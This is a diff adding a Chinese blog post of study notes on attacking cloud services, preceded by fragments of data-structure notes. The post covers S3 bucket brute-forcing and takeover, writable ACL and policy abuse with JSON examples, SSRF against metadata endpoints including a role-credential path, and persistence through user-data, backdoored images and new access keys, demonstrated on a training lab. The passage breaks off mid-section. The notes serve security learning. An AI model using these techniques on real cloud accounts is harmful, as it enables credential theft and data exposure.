return true; } bool GetTop(SqStack &amp;amp;amp;S, Elemtype &amp;amp;amp;e) { if (S.top == -1) { //栈为空，无法读取 return false; } e = S.data[S.top]; return true; } 2. top 表示“下一个可存放元素的位置” 注意一开始 top 指针置为 0
+">数据结构之栈、队列和数组</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8/" class="article-link" data-summary="数据结构之绪论与线性表 第二章_线性表 2.1 线性表的定义和基本操作 2.1.1 线性表的定义 线性表是由n(n&amp;amp;gt;=0)个相同数据类型的元素组成的有限序列（数据类型相同，有限，有序）
+本小节介绍的线性表是一种逻辑结构，在线性表的重要术语中需要特别注意位序这一概念与数组下标的不同之处：位序是线性表中元素的逻辑位置（从 1 开始编号），数组下标是存储结构中的物理索引（通常从 0 开始），只有在线性表采用数组实现时，二者才满足位序 = 下标 &#43; 1。
+2.1.2 线性表的基本操作 线性表的基本操作，本质上就是数据结构三要素中“数据的运算”的具体体现。由于大多数高校采用严蔚敏版教材，这里介绍的函数名也采用这版的：
+InitList(&amp;amp;amp;L)：初始化表。构造一个空的线性表 L，并分配内存空间。 DestroyList(&amp;amp;amp;L)：销毁操作。销毁线性表，并释放线性表 L 所占用的内存空间。 ListInsert(&amp;amp;amp;L, i, e)：插入操作。在表 L 中的第 i 个位置上插入指定元素 e。 ListDelete(&amp;amp;amp;L, i, &amp;amp;amp;e)：删除操作。删除表 L 中第 i 个位置的元素，并用 e 返回删除的元素值。 LocateElem(L, e)：按值查找操作。在表 L 中查找具有给定关键字值的元素。 GetElem(L, i)：按位查找操作。获取表 L 中第 i 个位置的元素的值。 Length(L)：求表长。返回线性表 L 的长度，即 L 中数据元素的个数。 PrintList(L)：输出操作。按前后顺序输出线性表 L 的所有元素值。 Empty(L)：判空操作。若 L 为空表，则返回 true，否则返回 false。 2.2 顺序表 本小节思维导图如下： 2.2.1 顺序表的定义 线性表的顺序存储也称顺序表。它是用一段地址连续的存储单元依次存储线性表中的数据元素，使得逻辑上相邻的元素在物理位置上也相邻。顺序表的逻辑顺序和存储顺序完全一致
+">数据结构之线性表</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BB%AA%E8%AE%BA/" class="article-link" data-summary="数据结构之绪论 第一章_绪论 1.1 数据结构在学什么 如何用程序代码把现实世界的问题信息化 如何用计算机高效地处理这些信息从而创造价值 只有详细学习过这四门课的人才能够更好理解信息化，这也是计算机专业的学生和只会写代码的人的区别所在 1.2 数据结构的基本概念 本小节会对数据结构中的基本概念做简单讲解，目的在于了解和理解概念，具体的深入了解会在后面的章节中提到，本小节的思维导图如下： 1.2.1 基本概念 1.2.1.1 数据 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合，数据是计算机程序加工的原料。
+简单来看，在计算机的世界中，数据就是0和1
+1.2.1.2 数据元素、数据项 数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位
+其实什么是数据元素什么是数据项，得根据实际的业务需求来确定，比如以微博举例：每一个账号为一个数据元素，而账号里的每一个信息为一个数据项： 1.2.1.3 数据结构、数据对象 数据结构是相互之间存在一种或者多种特定关系的数据元素的集合，数据对象是具有相同性质的数据元素的集合。
+其实简单理解就是数据对象是一堆相同性质的数据集合，而数据结构是在数据对象的基础上，还规定了数据结构的三要素&amp;amp;ndash;逻辑关系，存储结构，数据的运算。
+1.2.1.4 数据类型、抽象数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。分为原子类型（其值不可再分的数据类型）和结构类型（其值可以分解成若干成分的数据类型）
+抽象数据类型(Abstract Data Type,ADT) 是抽象数据组织及与之相关的操作
+若从数据结构的三要素来进行讨论，数据类型和抽象数据类型都只是实现了逻辑结构和数据的运算，不涉及具体的存储结构和实现细节。
+1.2.2 数据结构三要素 非常重要，我们再数据结构的学习中，任何涉及到数据结构的地方，首先想到的就应该是三要素
+1.2.2.1 逻辑结构 数据的逻辑结构只分为以下的四种结构，在考研数据结构中主要是讨论后三种逻辑结构：
+集合：各个数据元素同属一个集合，之间没有任何关系。 线性结构：数据元素之间是一对一的关系，除了第一个元素，所有的元素都有唯一前驱，除了最后一个元素，任何元素都有唯一后继 树形结构，就像树枝一样，数据元素之间是一对多的关系，比如本小节开始给的思维导图就是树形结构的关系 图结构：数据元素之间存在多对多的关系，像一张网一样。 1.2.2.2 存储结构（物理结构） 数据的存储结构（物理结构）是指数据在计算机内存中的存储方式，常见有以下四种：
+顺序存储：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现，要求给数据元素分配的是一片连续的内存空间，就像C语言中的数组。 链式存储：逻辑上相邻的元素可能在物理位置上表示不相邻，借助指示元素存储地址的指针来表示元素间的逻辑地址关系，就像C语言中的链表。 索引存储：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。就像操作系统中分页存储中的页表。 散列存储：根据元素的关键字通过散列函数直接计算出元素的存储地址，又称哈希(Hash)存储。具体比较复杂，后面在做讲解，这里了解就好。 1.2.2.3 数据的运算 数据的运算是施加在数据上的运算，包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。
+主要就是数据结构的创销，增删改查。
+数据的运算（“能对数据做什么”） │ ├── 运算的定义（面向逻辑结构） │ ├── 插入 │ ├── 删除 │ ├── 查找 │ ├── 修改 │ └── 遍历 │ └── 运算的实现（面向存储结构） ├── 顺序存储：移动元素 / 下标访问 ├── 链式存储：修改指针 ├── 索引存储：先查索引再访问数据 └── 散列存储：通过散列函数定位 1.3 算法的基本概念 算法（Algorithm）是对特定问题求解步骤的描述，是一个有穷的指令序列，其中每条指令表示一个或者多个操作。
+">数据结构之绪论</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>计算机网络</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+  
+</div>
+  <div class="content-center">
+    <article class="markdown-body">
+      <h1 class="post-title-template">云服务学习</h1>
+      <div class="post-date" style="margin-bottom: 20px; color: var(--text-color); opacity: 0.7; font-size: 0.9em;">
+        
+        
+            2025-12-11
+        
+      </div>
+      <h1 id="云服务学习">云服务学习</h1>
+<p>云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务</p>
+<p>国内云厂商：</p>
+<ul>
+<li>阿里云</li>
+<li>腾讯云</li>
+<li>华为云</li>
+<li>天翼云</li>
+<li>Ucloud</li>
+<li>金山云</li>
+<li>&hellip;&hellip;</li>
+</ul>
+<p>国外云厂商：</p>
+<ul>
+<li>AWS</li>
+<li>GCP</li>
+<li>Azure</li>
+<li>&hellip;&hellip;</li>
+</ul>
+<p>每个云厂商对云服务的叫法不同，这里以AWS的为例：</p>
+<ul>
+<li>S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别</li>
+<li>EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机</li>
+<li>RDS云数据库（Relational Database Service），简单理解为云上数据库</li>
+<li>IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限</li>
+</ul>
+<p>综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究</p>
+<p>在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用<a href="https://github.com/HXSecurity/TerraformGoat">TerraformGoat</a>靶场进行演示</p>
+<p>学习顺序参考https://wiki.teamssix.com/</p>
+<h2 id="对象存储">对象存储</h2>
+<p>对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议</p>
+<p>Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个<code>key</code>、<code>Data</code>、<code>Metadata</code>部分：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250220033100066.png" alt="image-20250220033100066"></p>
+<ul>
+<li><strong>Key</strong>指存储桶中的唯一标识符，例如一个 URL 为：<code>https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3</code>，这里的 yuy0ung 是存储桶 Bucket 的名称，<code>/d0g3</code> 就是 Key</li>
+<li><strong>Data</strong>很好理解，就是存储的数据本体</li>
+<li><strong>Metadata</strong>意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找）</li>
+</ul>
+<p>操作使用Amazon S3的方式大致如下：</p>
+<ul>
+<li>AWS 控制台操作</li>
+<li>AWS 命令行工具操作</li>
+<li>AWS SDK 操作</li>
+<li>REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象</li>
+</ul>
+<p>接下来记录S3相关攻击手法</p>
+<h3 id="bucket爆破">Bucket爆破</h3>
+<p>在不知道bucket名称的时候，可以通过爆破获得Bucket名称，类似于在常规渗透中的子域名挖掘，但略有区别：</p>
+<ul>
+<li>子域名挖掘通常通过响应的状态码进行判断</li>
+<li>Bucket爆破通过页面回显的内容进行判断</li>
+</ul>
+<p>当 Bucket 不存在时有如下两种返回情况，分别是 InvalidBucketName 和 NoSuchBucket：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250221030638380.png" alt="image-20250221030638380"></p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250221030434902.png" alt="image-20250221030434902"></p>
+<p>存在时同样有两种情况，一种是列出Object，当然这样可能存在存储桶遍历导致敏感信息泄漏：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225205142031.png" alt="image-20250225205142031"></p>
+<p>一种是显示AccessDenied：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250221030925653.png" alt="image-20250221030925653"></p>
+<p>这样通过返回内容的不同，就可以进行 Bucket 名称爆破了，知道 Bucket 名称后，Key 的爆破</p>
+<h3 id="bucket接管">Bucket接管</h3>
+<p>假如在进行渗透时，发现目标的一个子域名显示<code>NoSuchBucket</code>，那么只需要重新创建一个与HostID一样的存储桶名称即可接管该存储桶，接管后上传文件并设置公开即可让该域名显示我们上传的任意文件</p>
+<blockquote>
+<p>在腾讯云的对象存储中，无法造成以上的操作，因为在腾讯云的对象存储域名中，有一个APPID，这个APPID来自我们的账户信息中</p>
+</blockquote>
+<h3 id="任意文件上传">任意文件上传</h3>
+<p>如果对象存储的配置不当，比如公共读写，就有可能造成任意文件上传，甚至是文件覆盖</p>
+<p>攻击方法与中间件的PUT漏洞类似，使用PUT方法上传文件即可，若目标的对象存储支持html解析，那么还可以尝试进行XSS、挂暗链、挂黑页、供应链投毒等操作</p>
+<p>比如这里访问可以发现有一张图片：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222033443432.png" alt="image-20250222033443432"></p>
+<p>尝试使用PUT方法覆盖：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222033602837.png" alt="image-20250222033602837"></p>
+<p>接下来再尝试访问图片，可以发现内容已经被覆盖：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222033647417.png" alt="image-20250222033647417"></p>
+<h3 id="bucket-acl-可写">Bucket ACL 可写</h3>
+<p>ACL即访问控制列表，用来管理访问权限的规则，若 ACL <strong>可写</strong>，意味着用户或攻击者可以<strong>直接修改这些权限规则</strong></p>
+<p>比如下面的S3对象存储，在Bucket ACL可写时将<code>Permission</code>权限修改为FULL_CONTROL：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Owner&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;ID&#34;</span><span class="p">:</span> <span class="s2">&#34;d24***5&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Grants&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Grantee&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;Type&#34;</span><span class="p">:</span> <span class="s2">&#34;Group&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;URI&#34;</span><span class="p">:</span> <span class="s2">&#34;http://acs.amazonaws.com/groups/global/AllUsers&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span> 
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Permission&#34;</span><span class="p">:</span> <span class="s2">&#34;FULL_CONTROL&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这样一来，写入策略后即可实现存储桶的遍历等操作</p>
+<h3 id="object-acl-可写">Object ACL 可写</h3>
+<p>原理和上面的Bucket ACL可写类似</p>
+<p>比如这里访问flag没有权限：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222040230453.png" alt="image-20250222040230453"></p>
+<p>我们通过<code>?acl</code>来查看这个对象的权限：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222040710149.png" alt="image-20250222040710149"></p>
+<p>发现是<code>private</code>，尝试通过PUT方法修改为<code>public-read</code>，需要在请求头添加<code>x-oss-object-acl</code>参数：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222040948243.png" alt="image-20250222040948243"></p>
+<p>回显200，看来修改成功了，再次尝试访问flag，发现成功将flag改为公共可读：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222041044962.png" alt="image-20250222041044962"></p>
+<h3 id="bucket-策略可写">Bucket 策略可写</h3>
+<p>部分环境的acl可读写：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222043501561.png" alt="image-20250222043501561"></p>
+<p>可以尝试通过PUT方法修改策略读取敏感文件，比如这个S3对象存储的Bucket策略：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;2012-10-17&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Statement&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;AWS&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;*&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;s3:GetBucketPolicy&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;s3:PutBucketPolicy&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;arn:aws:s3:::teamssix&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Deny&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Principal&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;AWS&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;*&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;s3:GetObject&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;arn:aws:s3:::teamssix/flag&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这里禁止读取flag</p>
+<p>但如果将第20行的<code>Deny</code>改为<code>Allow</code>，即可成功访问flag</p>
+<p>当然，有的场景将Allow改为Deny则有可能导致业务瘫痪</p>
+<h3 id="bucket-object-遍历">Bucket Object 遍历</h3>
+<p>和常规WEB服务的<code>index of</code>目录遍历类似，可以访问Bucket可以查看其中所有的Object，将其中的Key拼接到站点URL后面即可访问相应对象</p>
+<p>比如这里的对象遍历，可以看见Key为flag：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250225205403600.png" alt="image-20250225205403600"></p>
+<p>拼接即可访问：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222044401142.png" alt="image-20250222044401142"></p>
+<h3 id="特殊的bucket-策略">特殊的Bucket 策略</h3>
+<p>有些 Bucket 会将策略配置成只允许某些特定条件才允许访问，当我们知道这个策略后，就可以访问该 Bucket 的相关对象</p>
+<p>比如这个Bucket，正常访问会被拒绝：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222044922345.png" alt="image-20250222044922345"></p>
+<p>但如果我们添加一个策略指定的UA头<code>HxSecurityLab</code>，就能够成功访问：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250222045227082.png" alt="image-20250222045227082"></p>
+<h2 id="弹性计算">弹性计算</h2>
+<p>前面提到EC2弹性计算可以简单理解为云上的虚拟机，而这里的“弹性”，则是其一大特点：</p>
+<p><strong>按需配置</strong>：CPU、内存、硬盘、网络等硬件参数随时调整（秒级切换）</p>
+<p><strong>弹性伸缩</strong>：服务器数量可根据流量自动增减，应对突发高峰或节省闲置成本</p>
+<p>弹性计算在国内叫ECS居多，同样也存在一些安全问题，下面进行记录</p>
+<h3 id="弹性计算面临的风险">弹性计算面临的风险</h3>
+<h4 id="1凭证泄露">1.凭证泄露</h4>
+<p>云上的凭证泄漏可以如下划分：</p>
+<ul>
+<li>控制台账号密码泄露，例如登录控制台的账号密码</li>
+<li>临时凭证泄露</li>
+<li>访问密钥泄露，比如AK/SK泄露</li>
+<li>实例登录凭证泄露，例如 AWS 在创建 EC2 生成的证书文件遭到泄露</li>
+</ul>
+<p>凭证信息的收集一般有如下方法：</p>
+<ul>
+<li>github敏感信息搜索</li>
+<li>反编译APK、小程序</li>
+<li>网站源码泄露</li>
+</ul>
+<h4 id="2元数据">2.元数据</h4>
+<p>元数据服务是一种提供查询运行中的实例内元数据的服务，当实例向元数据服务发起请求时，该请求不会通过外部网络传输，而是通过本地网络请求</p>
+<p>根据上面所说，如果获得了目标 EC2 权限或者目标 EC2 存在 SSRF 漏洞，就可以获得到实例的元数据</p>
+<p>下面是可以 ssrf 的常见元数据点：</p>
+<blockquote>
+<p><strong>packet</strong></p>
+<p><a href="https://metadata.packet.net/userdata">https://metadata.packet.net/userdata</a></p>
+<p><strong>google</strong></p>
+<p><a href="http://metadata.google.internal/computeMetadata/v1beta1/">http://metadata.google.internal/computeMetadata/v1beta1/</a>
+http://169.254.169.254/computeMetadata/v1/
+<a href="http://metadata.google.internal/computeMetadata/v1/">http://metadata.google.internal/computeMetadata/v1/</a>
+http://metadata/computeMetadata/v1/
+<a href="http://metadata.google.internal/computeMetadata/v1/instance/hostname">http://metadata.google.internal/computeMetadata/v1/instance/hostname</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/instance/id">http://metadata.google.internal/computeMetadata/v1/instance/id</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/project/project-id">http://metadata.google.internal/computeMetadata/v1/project/project-id</a>
+<a href="http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true">http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true</a></p>
+<p><strong>orcale</strong></p>
+<p>http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/</p>
+<p><strong>alibaba</strong></p>
+<p>http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id</p>
+</blockquote>
+<p>在云场景下，可以通过元数据进行临时凭证和其他信息的收集，以阿里云ECS（和EC2相似）的靶场为例：</p>
+<ul>
+<li>
+<p>这里有一个ssrf漏洞点：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250223213419438.png" alt="image-20250223213419438"></p>
+</li>
+<li>
+<p>能够进行任意文件读取：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250223213604849.png" alt="image-20250223213604849"></p>
+</li>
+<li>
+<p>尝试SSRF读取元数据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://100.100.100.200/latest/meta-data/
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250223213736113.png" alt="image-20250223213736113"></p>
+<p>可以看见很多metadata，下面列出一些对于红队而言价值较高的metadata，可以用于参考：</p>
+<blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mac    实例 MAC 地址
+</span></span><span class="line"><span class="cl">hostname    实例主机名
+</span></span><span class="line"><span class="cl">iam/info    获取角色名称
+</span></span><span class="line"><span class="cl">local-ipv4    实例本地 IP
+</span></span><span class="line"><span class="cl">public-ipv4    实例公网 IP
+</span></span><span class="line"><span class="cl">instance-id    实例 ID
+</span></span><span class="line"><span class="cl">public-hostname    接口的公有 DNS (IPv4)
+</span></span><span class="line"><span class="cl">placement/region    实例的 AWS 区域
+</span></span><span class="line"><span class="cl">public-keys/0/openssh-key    公有密钥
+</span></span><span class="line"><span class="cl">/iam/security-credentials/&lt;rolename&gt;    获取角色的临时凭证
+</span></span></code></pre></div></blockquote>
+<p>我们可以拼接路由访问其中内容：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250223213946664.png" alt="image-20250223213946664"></p>
+</li>
+<li>
+<p>当然我们也可以尝试读取user-data (前提是目标已经配置了用户数据，不然会返回 404)：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://100.100.100.200/latest/user-data/
+</span></span></code></pre></div><blockquote>
+<p>User Data 是在创建 ECS 实例时，可以提供给实例的一种自定义数据，通常用于自动化配置或脚本执行
+它的内容类似于dockerfile的内容，能允许用户在实例启动时自动执行某些操作</p>
+</blockquote>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250223214608538.png" alt="image-20250223214608538"></p>
+<p>发现在启动时写入了flag，尝试读取：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250223214729694.png" alt="image-20250223214729694"></p>
+</li>
+</ul>
+<h4 id="3账号劫持">3.账号劫持</h4>
+<p>如果云厂商的控制台存在漏洞，用户账号也会存在一定风险</p>
+<blockquote>
+<p>AWS 的控制台曾经出现过一些 XSS 漏洞，攻击者就可能会使用这些 XSS 漏洞进行账号劫持，从而获得目标云服务器实例的权限</p>
+</blockquote>
+<h4 id="4恶意的镜像">4.恶意的镜像</h4>
+<p>其实就是我们常说的供应链攻击</p>
+<p>AWS 在创建实例的时候，用户可以选择使用公共镜像或者自定义镜像，如果这些镜像中有恶意的镜像，那么目标使用该镜像创建实例就会产生风险</p>
+<blockquote>
+<p>以 CVE-2018-15869 为例，关于该漏洞的解释是：当人们通过 AWS 命令行使用「ec2  describe-images」功能时如果没有指定 &ndash;owners 参数，可能会在无意中加载恶意的 Amazon 系统镜像 ( AMI），导致 EC2 被用来挖矿</p>
+</blockquote>
+<p>对此，在使用 AWS 命令行时应该确保自己使用的是不是最新版的 AWS 命令行，同时确保从可信的来源去获取 Amazon 系统镜像</p>
+<h4 id="5其他的初始访问方法">5.其他的初始访问方法</h4>
+<p>除了上面提到的方法，还可以通过云服务上的应用程序漏洞、SSH与RDP的弱口令等传统场景下的方法进入目标实例</p>
+<h3 id="使用用户数据执行命令">使用用户数据执行命令</h3>
+<p>在上面我们提到了功能类似于dockerfikle的user-data，我们可以联想到：攻击者能修改实例的用户数据并向其中写入待执行的命令，这些代码将会在实例每次启动时自动执行</p>
+<p>通常来说修改user-data只能在dashboard或命令行上操作设置，所以想要恶意修改难度很大</p>
+<h3 id="弹性计算下的权限维持">弹性计算下的权限维持</h3>
+<p>这里记录一些传统渗透之外的权限维持手法</p>
+<h4 id="1用户数据">1.用户数据</h4>
+<p>类似于开机启动项，利用user-data执行反弹shell命令即可实现维持</p>
+<p>但很鸡肋的是：user-data只能在实例停止时修改，并且目标有可能很长时间不会重启实例</p>
+<h4 id="2后门镜像">2.后门镜像</h4>
+<p>在获取到控制台权限后可以尝试对镜像进行修改、删除创建，以此替换上后门镜像</p>
+<p>如此，下次用户在选用该镜像创建实例的时候，就会触发镜像中的恶意代码</p>
+<h4 id="3创建访问密钥">3.创建访问密钥</h4>
+<p>如果条件允许，可以尝试创建新的访问密钥进行权限维持</p>
+<h4 id="4创建辅助账号">4.创建辅助账号</h4>
+<p>通过创建高权限子账号的方式进行权限维持，然后通过这个子账号进行后续的持续攻击行为</p>
+<h3 id="获取共享快照数据">获取共享快照数据</h3>
+<p>如果当前凭证有相关权限，可以通过创建共享快照的方式，将控制台下的实例挂载由该快照生成的卷，从而获取到目标的弹性计算中的内容</p>
+<p>在拿到目标控制台权限时，如果无法登录到实例，可以为目标实例打个快照，然后将快照共享给自己，我们再将其挂载到自己的实例，即可查看里面的数据</p>
+<p>另外，在平时进行云上攻防的时候，偶尔会碰到虽然有 ECS 实例管理权限但无法在实例上执行命令的情况，我们同样可以采取类似的思路：</p>
+<blockquote>
+<p>为目标实例打快照 —&gt; 创建磁盘 —&gt; 创建实例 —&gt; 挂载磁盘 —&gt; 利用 SAM 等文件获取密码或哈希 —&gt; 使用密码或哈希远程登录获取权限</p>
+</blockquote>
+<p>其实如果对内网渗透比较熟悉的话，可以看出来这个思路其实就类似于<strong>卷影拷贝获取域控的ntds.dit</strong></p>
+<h2 id="rds云数据库">RDS云数据库</h2>
+<p>即云上的数据库服务，适用于需要托管和管理关系型数据库的各种场景</p>
+<h3 id="rds信息收集">RDS信息收集</h3>
+<p>在RDS控制台中可以收集到一些目标公司人员信息，比如邮箱、目标 RDS TOP SQL 语句、TOP 连接主机、TOP 用户等</p>
+<p>当然在共享快照中，可以根据快照名称判断查找，查看是否有和目标相关联的快照，然后再通过还原快照的方式，尝试获得快照中 RDS 的数据</p>
+<h4 id="mssql读取实例信息">MSSQL读取实例信息</h4>
+<p>在拿到MSSQL数据库权限后，可以通过BULK INSERT 读取数据库所在实例的文件，比如AWS下读取日志文件：</p>
